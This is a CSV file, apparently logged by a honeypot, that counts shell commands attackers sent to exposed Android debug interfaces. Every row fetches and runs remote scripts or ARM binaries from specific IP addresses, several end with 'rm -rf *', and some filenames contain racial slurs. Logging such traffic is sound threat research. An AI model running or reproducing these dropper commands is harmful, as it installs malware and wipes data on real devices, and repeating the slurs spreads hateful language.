input,count
cd /data/local/tmp/; busybox wget http://20.221.64.23/w.sh; sh w.sh; curl http://20.221.64.23/c.sh; sh c.sh,1
cd /data/local/tmp/; busybox wget http://205.185.113.47/w.sh; sh w.sh; curl http://205.185.113.47/c.sh; sh c.sh; wget http://205.185.113.47/wget.sh; sh wget.sh,3
cd /data/local/tmp/; busybox wget http://209.38.31.174/wmlsw.sh; sh wmlsw.sh; rm -rf wmlsw.sh; rm -rf *,2
cd /data/local/tmp/; busybox wget http://213.209.129.101/adbyoupoopyheadshitface.sh; sh adbyoupoopyheadshitface.sh; rm -rf adbyoupoopyheadshitface.sh,2
cd /data/local/tmp/; busybox wget http://213.209.129.55/poop.sh; sh poop.sh; rm -rf poop.sh,29
cd /data/local/tmp/; busybox wget http://213.209.129.92/booty.sh; sh booty.sh; rm -rf booty.sh,6
cd /data/local/tmp/; busybox wget http://213.209.129.92/somekidsmom.sh; sh somekidsmom.sh; rm -rf somekidsmom.sh,3
cd /data/local/tmp/; busybox wget http://23.146.184.166/w.sh; sh w.sh; curl http://23.146.184.166/c.sh; sh c.sh,14
cd /data/local/tmp/; busybox wget http://23.146.184.61/w.sh; sh w.sh; curl http://23.146.184.61/c.sh; sh c.sh,17
cd /data/local/tmp/; busybox wget http://42.112.26.36/adb.sh -O- | sh,114
cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,333
cd /data/local/tmp/; busybox wget http://45.11.229.38/fuckoffnigger22241.sh; sh fuckoffnigger22241.sh; rm -rf fuckoffnigger22241.sh; rm -rf *,1
cd /data/local/tmp/; busybox wget http://45.12.130.27/w.sh; sh w.sh; curl http://45.12.130.27/c.sh; sh c.sh,3
cd /data/local/tmp/; busybox wget http://45.125.66.103/w.sh; sh w.sh; curl http://45.125.66.103/c.sh; sh c.sh,2
